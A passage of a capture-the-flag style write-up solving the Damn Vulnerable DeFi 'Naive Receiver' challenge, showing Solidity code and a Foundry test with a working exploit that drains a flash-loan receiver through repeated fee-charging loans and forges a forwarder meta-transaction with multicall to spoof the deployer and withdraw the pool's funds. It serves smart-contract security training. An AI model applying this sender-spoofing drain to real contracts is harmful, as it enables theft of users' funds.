</span></span><span class=line><span class=ln>80</span><span class=cl>        <span class=n>weth</span><span class=p>.</span><span class=n>deposit</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span> <span class=n>amount</span><span class=p>}();</span>
</span></span><span class=line><span class=ln>81</span><span class=cl>
</span></span><span class=line><span class=ln>82</span><span class=cl>        <span class=n>deposits</span><span class=p>[</span><span class=n>_msgSender</span><span class=p>()]</span> <span class=o>+=</span> <span class=n>amount</span><span class=p>;</span>
</span></span><span class=line><span class=ln>83</span><span class=cl>        <span class=n>totalDeposits</span> <span class=o>+=</span> <span class=n>amount</span><span class=p>;</span>
</span></span><span class=line><span class=ln>84</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>85</span><span class=cl>
</span></span><span class=line><span class=ln>86</span><span class=cl>    <span class=kd>function</span> <span class=nf>_msgSender</span><span class=p>()</span> <span class=k>internal</span> <span class=k>view</span> <span class=k>override</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>address</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>87</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>trustedForwarder</span> <span class=o>&amp;&amp;</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>data</span><span class=p>.</span><span class=n>length</span> <span class=o>&gt;=</span> <span class=mi>20</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>88</span><span class=cl>            <span class=k>return</span> <span class=kt>address</span><span class=p>(</span><span class=kt>bytes20</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>data</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>data</span><span class=p>.</span><span class=n>length</span> <span class=o>-</span> <span class=mi>20</span><span class=o>:</span><span class=p>]));</span>
</span></span><span class=line><span class=ln>89</span><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>90</span><span class=cl>            <span class=k>return</span> <span class=nb>super</span><span class=p>.</span><span class=n>_msgSender</span><span class=p>();</span>
</span></span><span class=line><span class=ln>91</span><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=ln>92</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>93</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The below is the test contract where we write our exploit logic. 5. <strong>NavieReceiver</strong> contract</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln>  1</span><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=ln>  2</span><span class=cl><span class=c1>// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
</span></span></span><span class=line><span class=ln>  3</span><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>=</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>25</span><span class=p>;</span>
</span></span><span class=line><span class=ln>  4</span><span class=cl>
</span></span><span class=line><span class=ln>  5</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>Test</span><span class=p>,</span> <span class=n>console</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;forge-std/Test.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln>  6</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>NaiveReceiverPool</span><span class=p>,</span> <span class=n>Multicall</span><span class=p>,</span> <span class=n>WETH</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;../../src/naive-receiver/NaiveReceiverPool.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln>  7</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>FlashLoanReceiver</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;../../src/naive-receiver/FlashLoanReceiver.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln>  8</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>BasicForwarder</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;../../src/naive-receiver/BasicForwarder.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln>  9</span><span class=cl>
</span></span><span class=line><span class=ln> 10</span><span class=cl><span class=kd>contract</span> <span class=nc>NaiveReceiverChallenge</span> <span class=k>is</span> <span class=n>Test</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 11</span><span class=cl>    <span class=kt>address</span> <span class=n>deployer</span> <span class=o>=</span> <span class=n>makeAddr</span><span class=p>(</span><span class=s>&#34;deployer&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 12</span><span class=cl>    <span class=kt>address</span> <span class=n>recovery</span> <span class=o>=</span> <span class=n>makeAddr</span><span class=p>(</span><span class=s>&#34;recovery&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 13</span><span class=cl>    <span class=kt>address</span> <span class=n>player</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 14</span><span class=cl>    <span class=kt>uint256</span> <span class=n>playerPk</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 15</span><span class=cl>
</span></span><span class=line><span class=ln> 16</span><span class=cl>    <span class=kt>uint256</span> <span class=k>constant</span> <span class=n>WETH_IN_POOL</span> <span class=o>=</span> <span class=mi>1000</span><span class=n>e18</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 17</span><span class=cl>    <span class=kt>uint256</span> <span class=k>constant</span> <span class=n>WETH_IN_RECEIVER</span> <span class=o>=</span> <span class=mi>10</span><span class=n>e18</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 18</span><span class=cl>
</span></span><span class=line><span class=ln> 19</span><span class=cl>    <span class=n>NaiveReceiverPool</span> <span class=n>pool</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 20</span><span class=cl>    <span class=n>WETH</span> <span class=n>weth</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 21</span><span class=cl>    <span class=n>FlashLoanReceiver</span> <span class=n>receiver</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 22</span><span class=cl>    <span class=n>BasicForwarder</span> <span class=n>forwarder</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 23</span><span class=cl>
</span></span><span class=line><span class=ln> 24</span><span class=cl>    <span class=kd>modifier</span> <span class=nf>checkSolvedByPlayer</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 25</span><span class=cl>        <span class=n>vm</span><span class=p>.</span><span class=n>startPrank</span><span class=p>(</span><span class=n>player</span><span class=p>,</span> <span class=n>player</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 26</span><span class=cl>        <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 27</span><span class=cl>        <span class=n>vm</span><span class=p>.</span><span class=n>stopPrank</span><span class=p>();</span>
</span></span><span class=line><span class=ln> 28</span><span class=cl>        <span class=n>_isSolved</span><span class=p>();</span>
</span></span><span class=line><span class=ln> 29</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln> 30</span><span class=cl>
</span></span><span class=line><span class=ln> 31</span><span class=cl>    <span class=cm>/**
</span></span></span><span class=line><span class=ln> 32</span><span class=cl><span class=cm>     * SETS UP CHALLENGE - DO NOT TOUCH
</span></span></span><span class=line><span class=ln> 33</span><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=ln> 34</span><span class=cl>    <span class=kd>function</span> <span class=nf>setUp</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 35</span><span class=cl>        <span class=p>(</span><span class=n>player</span><span class=p>,</span> <span class=n>playerPk</span><span class=p>)</span> <span class=o>=</span> <span class=n>makeAddrAndKey</span><span class=p>(</span><span class=s>&#34;player&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 36</span><span class=cl>        <span class=n>startHoax</span><span class=p>(</span><span class=n>deployer</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 37</span><span class=cl>
</span></span><span class=line><span class=ln> 38</span><span class=cl>        <span class=c1>// Deploy WETH
</span></span></span><span class=line><span class=ln> 39</span><span class=cl><span class=c1></span>        <span class=n>weth</span> <span class=o>=</span> <span class=k>new</span> <span class=n>WETH</span><span class=p>();</span>
</span></span><span class=line><span class=ln> 40</span><span class=cl>
</span></span><span class=line><span class=ln> 41</span><span class=cl>        <span class=c1>// Deploy forwarder
</span></span></span><span class=line><span class=ln> 42</span><span class=cl><span class=c1></span>        <span class=n>forwarder</span> <span class=o>=</span> <span class=k>new</span> <span class=n>BasicForwarder</span><span class=p>();</span>
</span></span><span class=line><span class=ln> 43</span><span class=cl>
</span></span><span class=line><span class=ln> 44</span><span class=cl>        <span class=c1>// Deploy pool and fund with ETH
</span></span></span><span class=line><span class=ln> 45</span><span class=cl><span class=c1></span>        <span class=n>pool</span> <span class=o>=</span> <span class=k>new</span> <span class=n>NaiveReceiverPool</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span> <span class=n>WETH_IN_POOL</span><span class=p>}(</span><span class=kt>address</span><span class=p>(</span><span class=n>forwarder</span><span class=p>),</span> <span class=k>payable</span><span class=p>(</span><span class=n>weth</span><span class=p>),</span> <span class=n>deployer</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 46</span><span class=cl>
</span></span><span class=line><span class=ln> 47</span><span class=cl>        <span class=c1>// Deploy flashloan receiver contract and fund it with some initial WETH
</span></span></span><span class=line><span class=ln> 48</span><span class=cl><span class=c1></span>        <span class=n>receiver</span> <span class=o>=</span> <span class=k>new</span> <span class=n>FlashLoanReceiver</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>pool</span><span class=p>));</span>
</span></span><span class=line><span class=ln> 49</span><span class=cl>        <span class=n>weth</span><span class=p>.</span><span class=n>deposit</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span> <span class=n>WETH_IN_RECEIVER</span><span class=p>}();</span>
</span></span><span class=line><span class=ln> 50</span><span class=cl>        <span class=n>weth</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>receiver</span><span class=p>),</span> <span class=n>WETH_IN_RECEIVER</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 51</span><span class=cl>
</span></span><span class=line><span class=ln> 52</span><span class=cl>        <span class=n>vm</span><span class=p>.</span><span class=n>stopPrank</span><span class=p>();</span>
</span></span><span class=line><span class=ln> 53</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln> 54</span><span class=cl>
</span></span><span class=line><span class=ln> 55</span><span class=cl>    <span class=kd>function</span> <span class=nf>test_assertInitialState</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 56</span><span class=cl>        <span class=c1>// Check initial balances
</span></span></span><span class=line><span class=ln> 57</span><span class=cl><span class=c1></span>        <span class=n>assertEq</span><span class=p>(</span><span class=n>weth</span><span class=p>.</span><span class=n>balanceOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>pool</span><span class=p>)),</span> <span class=n>WETH_IN_POOL</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 58</span><span class=cl>        <span class=n>assertEq</span><span class=p>(</span><span class=n>weth</span><span class=p>.</span><span class=n>balanceOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>receiver</span><span class=p>)),</span> <span class=n>WETH_IN_RECEIVER</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 59</span><span class=cl>
</span></span><span class=line><span class=ln> 60</span><span class=cl>        <span class=c1>// Check pool config
</span></span></span><span class=line><span class=ln> 61</span><span class=cl><span class=c1></span>        <span class=n>assertEq</span><span class=p>(</span><span class=n>pool</span><span class=p>.</span><span class=n>maxFlashLoan</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>weth</span><span class=p>)),</span> <span class=n>WETH_IN_POOL</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 62</span><span class=cl>        <span class=n>assertEq</span><span class=p>(</span><span class=n>pool</span><span class=p>.</span><span class=n>flashFee</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>weth</span><span class=p>),</span> <span class=mi>0</span><span class=p>),</span> <span class=mi>1</span> <span class=kc>ether</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 63</span><span class=cl>        <span class=n>assertEq</span><span class=p>(</span><span class=n>pool</span><span class=p>.</span><span class=n>feeReceiver</span><span class=p>(),</span> <span class=n>deployer</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 64</span><span class=cl>
</span></span><span class=line><span class=ln> 65</span><span class=cl>        <span class=c1>// Cannot call receiver
</span></span></span><span class=line><span class=ln> 66</span><span class=cl><span class=c1></span>        <span class=n>vm</span><span class=p>.</span><span class=n>expectRevert</span><span class=p>(</span><span class=mh>0x48f5c3ed</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 67</span><span class=cl>        <span class=n>receiver</span><span class=p>.</span><span class=n>onFlashLoan</span><span class=p>(</span>
</span></span><span class=line><span class=ln> 68</span><span class=cl>            <span class=n>deployer</span><span class=p>,</span>
</span></span><span class=line><span class=ln> 69</span><span class=cl>            <span class=kt>address</span><span class=p>(</span><span class=n>weth</span><span class=p>),</span> <span class=c1>// token
</span></span></span><span class=line><span class=ln> 70</span><span class=cl><span class=c1></span>            <span class=n>WETH_IN_RECEIVER</span><span class=p>,</span> <span class=c1>// amount
</span></span></span><span class=line><span class=ln> 71</span><span class=cl><span class=c1></span>            <span class=mi>1</span> <span class=kc>ether</span><span class=p>,</span> <span class=c1>// fee
</span></span></span><span class=line><span class=ln> 72</span><span class=cl><span class=c1></span>            <span class=kt>bytes</span><span class=p>(</span><span class=s>&#34;&#34;</span><span class=p>)</span> <span class=c1>// data
</span></span></span><span class=line><span class=ln> 73</span><span class=cl><span class=c1></span>        <span class=p>);</span>
</span></span><span class=line><span class=ln> 74</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln> 75</span><span class=cl>
</span></span><span class=line><span class=ln> 76</span><span class=cl>    <span class=cm>/**
</span></span></span><span class=line><span class=ln> 77</span><span class=cl><span class=cm>     * CODE YOUR SOLUTION HERE
</span></span></span><span class=line><span class=ln> 78</span><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=ln> 79</span><span class=cl>    <span class=kd>function</span> <span class=nf>test_naiveReceiver</span><span class=p>()</span> <span class=k>public</span> <span class=n>checkSolvedByPlayer</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 80</span><span class=cl>        <span class=c1>///////////////////////////////////
</span></span></span><span class=line><span class=ln> 81</span><span class=cl><span class=c1></span>        <span class=c1>// Empty Receiver Balance//////////
</span></span></span><span class=line><span class=ln> 82</span><span class=cl><span class=c1></span>        <span class=c1>///////////////////////////////////
</span></span></span><span class=line><span class=ln> 83</span><span class=cl><span class=c1></span>
</span></span><span class=line><span class=ln> 84</span><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kt>uint8</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>10</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 85</span><span class=cl>            <span class=n>pool</span><span class=p>.</span><span class=n>flashLoan</span><span class=p>(</span><span class=n>receiver</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=n>weth</span><span class=p>),</span> <span class=n>WETH_IN_POOL</span><span class=p>,</span> <span class=kt>bytes</span><span class=p>(</span><span class=s>&#34;&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=ln> 86</span><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=ln> 87</span><span class=cl>
</span></span><span class=line><span class=ln> 88</span><span class=cl>        <span class=c1>///////////////////////////////////
</span></span></span><span class=line><span class=ln> 89</span><span class=cl><span class=c1></span>        <span class=c1>// Withdraw All Funds To Recovery//
</span></span></span><span class=line><span class=ln> 90</span><span class=cl><span class=c1></span>        <span class=c1>///////////////////////////////////
</span></span></span><span class=line><span class=ln> 91</span><span class=cl><span class=c1></span>
</span></span><span class=line><span class=ln> 92</span><span class=cl>        <span class=kt>uint256</span> <span class=n>total</span> <span class=o>=</span> <span class=n>WETH_IN_POOL</span> <span class=o>+</span> <span class=n>WETH_IN_RECEIVER</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 93</span><span class=cl>        <span class=kt>bytes</span> <span class=k>memory</span> <span class=n>Withdrawdata</span> <span class=o>=</span> <span class=nb>abi</span><span class=p>.</span><span class=nb>encodeWithSignature</span><span class=p>(</span><span class=s>&#34;withdraw(uint256,address)&#34;</span><span class=p>,</span> <span class=n>total</span><span class=p>,</span> <span class=n>recovery</span><span class=p>,</span> <span class=n>deployer</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 94</span><span class=cl>        <span class=kt>bytes</span><span class=p>[]</span> <span class=k>memory</span> <span class=n>multicall_data_array</span> <span class=o>=</span> <span class=k>new</span> <span class=kt>bytes</span><span class=p>[](</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 95</span><span class=cl>        <span class=n>multicall_data_array</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>Withdrawdata</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 96</span><span class=cl>        <span class=kt>bytes</span> <span class=k>memory</span> <span class=n>multicallEncodedData</span> <span class=o>=</span> <span class=nb>abi</span><span class=p>.</span><span class=nb>encodeWithSignature</span><span class=p>(</span><span class=s>&#34;multicall(bytes[])&#34;</span><span class=p>,</span> <span class=n>multicall_data_array</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 97</span><span class=cl>        <span class=n>BasicForwarder</span><span class=p>.</span><span class=n>Request</span> <span class=k>memory</span> <span class=n>executeRequest</span> <span class=o>=</span> <span class=n>BasicForwarder</span><span class=p>.</span><span class=n>Request</span><span class=p>({</span>
</span></span><span class=line><span class=ln> 98</span><span class=cl>            <span class=k>from</span><span class=o>:</span> <span class=n>player</span><span class=p>,</span>
</span></span><span class=line><span class=ln> 99</span><span class=cl>            <span class=n>target</span><span class=o>:</span> <span class=kt>address</span><span class=p>(</span><span class=n>pool</span><span class=p>),</span>
</span></span><span class=line><span class=ln>100</span><span class=cl>            <span class=nb>value</span><span class=o>:</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=ln>101</span><span class=cl>            <span class=nb>gas</span><span class=o>:</span> <span class=mi>100000</span><span class=p>,</span>
</span></span><span class=line><span class=ln>102</span><span class=cl>            <span class=n>nonce</span><span class=o>:</span> <span class=n>vm</span><span class=p>.</span><span class=n>getNonce</span><span class=p>(</span><span class=n>player</span><span class=p>),</span>
</span></span><span class=line><span class=ln>103</span><span class=cl>            <span class=nb>data</span><span class=o>:</span> <span class=n>multicallEncodedData</span><span class=p>,</span>
</span></span><span class=line><span class=ln>104</span><span class=cl>            <span class=n>deadline</span><span class=o>:</span> <span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span> <span class=o>+</span> <span class=mi>1000</span>
</span></span><span class=line><span class=ln>105</span><span class=cl>        <span class=p>});</span>
</span></span><span class=line><span class=ln>106</span><span class=cl>
</span></span><span class=line><span class=ln>107</span><span class=cl>        <span class=kt>bytes32</span> <span class=n>digest</span> <span class=o>=</span>
</span></span><span class=line><span class=ln>108</span><span class=cl>            <span class=nb>keccak256</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodePacked</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\x19\x01</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>forwarder</span><span class=p>.</span><span class=n>domainSeparator</span><span class=p>(),</span> <span class=n>forwarder</span><span class=p>.</span><span class=n>getDataHash</span><span class=p>(</span><span class=n>executeRequest</span><span class=p>)));</span>
</span></span><span class=line><span class=ln>109</span><span class=cl>
</span></span><span class=line><span class=ln>110</span><span class=cl>        <span class=p>(</span><span class=kt>uint8</span> <span class=n>v</span><span class=p>,</span> <span class=kt>bytes32</span> <span class=n>r</span><span class=p>,</span> <span class=kt>bytes32</span> <span class=n>s</span><span class=p>)</span> <span class=o>=</span> <span class=n>vm</span><span class=p>.</span><span class=n>sign</span><span class=p>(</span><span class=n>playerPk</span><span class=p>,</span> <span class=n>digest</span><span class=p>);</span>
</span></span><span class=line><span class=ln>111</span><span class=cl>
</span></span><span class=line><span class=ln>112</span><span class=cl>        <span class=n>forwarder</span><span class=p>.</span><span class=n>execute</span><span class=p>(</span><span class=n>executeRequest</span><span class=p>,</span> <span class=nb>abi</span><span class=p>.</span><span class=nb>encodePacked</span><span class=p>(</span><span class=n>r</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=n>v</span><span class=p>));</span>
</span></span><span class=line><span class=ln>113</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>114</span><span class=cl>
</span></span><span class=line><span class=ln>115</span><span class=cl>    <span class=cm>/**
</span></span></span><span class=line><span class=ln>116</span><span class=cl><span class=cm>     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
</span></span></span><span class=line><span class=ln>117</span><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=ln>118</span><span class=cl>    <span class=kd>function</span> <span class=nf>_isSolved</span><span class=p>()</span> <span class=k>private</span> <span class=k>view</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>119</span><span class=cl>        <span class=c1>// Player must have executed two or less transactions
</span></span></span><span class=line><span class=ln>120</span><span class=cl><span class=c1></span>        <span class=n>assertLe</span><span class=p>(</span><span class=n>vm</span><span class=p>.</span><span class=n>getNonce</span><span class=p>(</span><span class=n>player</span><span class=p>),</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=ln>121</span><span class=cl>
</span></span><span class=line><span class=ln>122</span><span class=cl>        <span class=c1>// The flashloan receiver contract has been emptied
</span></span></span><span class=line><span class=ln>123</span><span class=cl><span class=c1></span>        <span class=n>assertEq</span><span class=p>(</span><span class=n>weth</span><span class=p>.</span><span class=n>balanceOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>receiver</span><span class=p>)),</span> <span class=mi>0</span><span class=p>,</span> <span class=s>&#34;Unexpected balance in receiver contract&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>124</span><span class=cl>
</span></span><span class=line><span class=ln>125</span><span class=cl>        <span class=c1>// Pool is empty too
</span></span></span><span class=line><span class=ln>126</span><span class=cl><span class=c1></span>        <span class=n>assertEq</span><span class=p>(</span><span class=n>weth</span><span class=p>.</span><span class=n>balanceOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>pool</span><span class=p>)),</span> <span class=mi>0</span><span class=p>,</span> <span class=s>&#34;Unexpected balance in pool&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>127</span><span class=cl>
</span></span><span class=line><span class=ln>128</span><span class=cl>        <span class=c1>// All funds sent to recovery account
</span></span></span><span class=line><span class=ln>129</span><span class=cl><span class=c1></span>        <span class=n>assertEq</span><span class=p>(</span><span class=n>weth</span><span class=p>.</span><span class=n>balanceOf</span><span class=p>(</span><span class=n>recovery</span><span class=p>),</span> <span class=n>WETH_IN_POOL</span> <span class=o>+</span> <span class=n>WETH_IN_RECEIVER</span><span class=p>,</span> <span class=s>&#34;Not enough WETH in recovery account&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>130</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>131</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>In this challenge our task is to make <code>_isSolved()</code> function return true.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl><span class=kd>function</span> <span class=nf>_isSolved</span><span class=p>()</span> <span class=k>private</span> <span class=k>view</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 2</span><span class=cl>    <span class=c1>// Player must have executed two or less transactions
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=c1></span>    <span class=n>assertLe</span><span class=p>(</span><span class=n>vm</span><span class=p>.</span><span class=n>getNonce</span><span class=p>(</span><span class=n>player</span><span class=p>),</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 4</span><span class=cl>
</span></span><span class=line><span class=ln> 5</span><span class=cl>    <span class=c1>// The flashloan receiver contract has been emptied
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=c1></span>    <span class=n>assertEq</span><span class=p>(</span><span class=n>weth</span><span class=p>.</span><span class=n>balanceOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>receiver</span><span class=p>)),</span> <span class=mi>0</span><span class=p>,</span> <span class=s>&#34;Unexpected balance in receiver contract&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 7</span><span class=cl>
</span></span><span class=line><span class=ln> 8</span><span class=cl>    <span class=c1>// Pool is empty too
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=c1></span>    <span class=n>assertEq</span><span class=p>(</span><span class=n>weth</span><span class=p>.</span><span class=n>balanceOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>pool</span><span class=p>)),</span> <span class=mi>0</span><span class=p>,</span> <span class=s>&#34;Unexpected balance in pool&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>10</span><span class=cl>
</span></span><span class=line><span class=ln>11</span><span class=cl>    <span class=c1>// All funds sent to recovery account
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=c1></span>    <span class=n>assertEq</span><span class=p>(</span><span class=n>weth</span><span class=p>.</span><span class=n>balanceOf</span><span class=p>(</span><span class=n>recovery</span><span class=p>),</span> <span class=n>WETH_IN_POOL</span> <span class=o>+</span> <span class=n>WETH_IN_RECEIVER</span><span class=p>,</span> <span class=s>&#34;Not enough WETH in recovery account&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>13</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The <code>_isSolved()</code> will be passed if we make the balance of WETH tokens in the receiver and pool zero and transfer all those tokens to the recovery address. You can look into setUp() function in test contract to understand how everything is deployed.</p><p>Now, without any delay, let&rsquo;s dive into the key functions which has the exploit.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl><span class=kd>function</span> <span class=nf>flashLoan</span><span class=p>(</span><span class=n>IERC3156FlashBorrower</span> <span class=n>receiver</span><span class=p>,</span> <span class=kt>address</span> <span class=n>token</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>amount</span><span class=p>,</span> <span class=kt>bytes</span> <span class=n>calldata</span> <span class=nb>data</span><span class=p>)</span>
</span></span><span class=line><span class=ln> 2</span><span class=cl>        <span class=k>external</span>
</span></span><span class=line><span class=ln> 3</span><span class=cl>        <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span>
</span></span><span class=line><span class=ln> 4</span><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=ln> 5</span><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>token</span> <span class=o>!=</span> <span class=kt>address</span><span class=p>(</span><span class=n>weth</span><span class=p>))</span> <span class=nb>revert</span> <span class=n>UnsupportedCurrency</span><span class=p>();</span>
</span></span><span class=line><span class=ln> 6</span><span class=cl>
</span></span><span class=line><span class=ln> 7</span><span class=cl>    <span class=c1>// Transfer WETH and handle control to receiver
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=c1></span>    <span class=n>weth</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>receiver</span><span class=p>),</span> <span class=n>amount</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 9</span><span class=cl>    <span class=n>totalDeposits</span> <span class=o>-=</span> <span class=n>amount</span><span class=p>;</span>
</span></span><span class=line><span class=ln>10</span><span class=cl>
</span></span><span class=line><span class=ln>11</span><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>receiver</span><span class=p>.</span><span class=n>onFlashLoan</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=n>weth</span><span class=p>),</span> <span class=n>amount</span><span class=p>,</span> <span class=n>FIXED_FEE</span><span class=p>,</span> <span class=nb>data</span><span class=p>)</span> <span class=o>!=</span> <span class=n>CALLBACK_SUCCESS</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>12</span><span class=cl>        <span class=nb>revert</span> <span class=n>CallbackFailed</span><span class=p>();</span>
</span></span><span class=line><span class=ln>13</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>14</span><span class=cl>
</span></span><span class=line><span class=ln>15</span><span class=cl>    <span class=kt>uint256</span> <span class=n>amountWithFee</span> <span class=o>=</span> <span class=n>amount</span> <span class=o>+</span> <span class=n>FIXED_FEE</span><span class=p>;</span>
</span></span><span class=line><span class=ln>16</span><span class=cl>    <span class=n>weth</span><span class=p>.</span><span class=n>transferFrom</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>receiver</span><span class=p>),</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=n>amountWithFee</span><span class=p>);</span>
</span></span><span class=line><span class=ln>17</span><span class=cl>    <span class=n>totalDeposits</span> <span class=o>+=</span> <span class=n>amountWithFee</span><span class=p>;</span>
</span></span><span class=line><span class=ln>18</span><span class=cl>
